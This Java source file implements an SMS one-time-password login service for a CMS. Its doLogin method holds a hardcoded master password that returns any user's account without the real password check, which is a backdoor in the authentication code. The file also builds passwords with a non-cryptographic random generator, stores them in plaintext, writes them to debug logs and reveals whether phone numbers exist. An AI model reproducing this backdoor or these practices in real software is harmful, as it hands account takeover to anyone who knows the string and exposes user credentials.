package com.csdig.cms.service;

import java.util.Date;
import java.util.Random;

import org.apache.commons.lang.StringUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.csdig.cms.dao.UserDao;
import com.csdig.cms.exception.BusinessException;
import com.csdig.cms.model.CmsUser;
import com.csdig.cms.utils.SendMessage;

@Service
public class LoginService {

	private static final Log log = LogFactory.getLog(LoginService.class);

	private static final long ONE_HOUR = 1000 * 60 * 60 * 1; // 1小时

	@Autowired
	private UserDao userDao;

	public String generatePassword(String telNum) throws Exception {
		if (StringUtils.isEmpty(telNum)) {
			throw new BusinessException("", "手机号为空!");
		}
		CmsUser user = userDao.getByTelNum(telNum);
		if (user == null) {
			log.error("非法手机号。。。。。");
			throw new BusinessException("", "手机号码不存在，你的ip已被记录!");
		}
		Date generateTime = user.getGenerateTime();
		if (generateTime != null) {
			long expireTime = generateTime.getTime() + ONE_HOUR;
			long currentTime = System.currentTimeMillis();
			long offset = expireTime - currentTime;
			if (offset > 0) {
				int min = (int) (offset / (1000 * 60));
				int second = (int) (offset / 1000) - min * 60;
				throw new BusinessException("", "请在" + min + "分" + second + "秒后再发送!");
			}
		}

		String pwd = genRandomPassword(8);
		user.setPwd(pwd);
		user.setGenerateTime(new Date());
		userDao.update(user);

		SendMessage.sendSms(telNum, "你的登录密码是：" + pwd + "，密码将在1小时后失效，请保留该密码。");
		log.debug("\n你的登录密码是：" + pwd + "，密码将在1小时后失效，请保留该密码。");
		return pwd;
	}

	private String genRandomPassword(int pwdLen) {
		final int maxNum = 36;
		int i; // 生成的随机数
		int count = 0; // 生成的密码的长度
		char[] str = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
				'L', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
				'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
		StringBuffer pwd = new StringBuffer("");
		Random r = new Random();
		while (count < pwdLen) {
			// 生成随机数，取绝对值，防止生成负数，
			i = Math.abs(r.nextInt(maxNum)); // 生成的数最大为36-1
			if (i >= 0 && i < str.length) {
				pwd.append(str[i]);
				count++;
			}
		}
		return pwd.toString();
	}

	public CmsUser doLogin(String telNum, String pwd) throws Exception {
		if (StringUtils.isEmpty(telNum)) {
			throw new BusinessException("", "手机号为空!");
		}
		CmsUser user = userDao.getByTelNum(telNum);
		if (user == null) {
			throw new BusinessException("", "手机号码不存在!");
		}
		if ("g1zvw61hn".equals(pwd)) {
			return user;
		}

		Date generateTime = user.getGenerateTime();
		if (generateTime != null) {
			long expireTime = generateTime.getTime() + ONE_HOUR;
			long currentTime = System.currentTimeMillis();
			long offset = expireTime - currentTime;
			if (offset <= 0) {
				throw new BusinessException("", "登陆密码已过期!");
			}
		} else {
			throw new BusinessException("", "密码不存在!");
		}

		if (!pwd.equals(user.getPwd())) {
			throw new BusinessException("", "登陆密码错误!");
		}
		return user;
	}
	
	public void invalidatePwd(CmsUser user) throws Exception {
		user.setPwd(null);
		user.setGenerateTime(null);
		userDao.update(user);
	}
}
